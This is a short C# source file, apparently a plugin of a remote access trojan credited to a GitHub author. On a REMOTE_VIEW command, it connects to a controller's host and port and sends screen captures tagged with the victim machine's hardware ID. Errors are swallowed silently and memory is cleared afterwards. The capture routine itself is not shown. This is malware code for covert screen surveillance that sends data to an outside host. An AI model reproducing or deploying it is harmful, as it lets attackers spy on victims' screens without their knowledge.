using Shared;
using System.Net;
using System.Net.Sockets;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                PacketType T = (PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case PacketType.REMOTE_VIEW:
                        Socket SCam = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPEndPoint epCam = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                        SCam.Connect(epCam);
                        Functions.C = new Client(SCam);
                        Functions.hasToCapture = true;
                        Functions.SendCapture((int)Param[1], (int)Param[2], (int)Param[3], Param[4].ToString(), HWID, key, BaseIP);

                        break;

                }
            }
            catch { }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
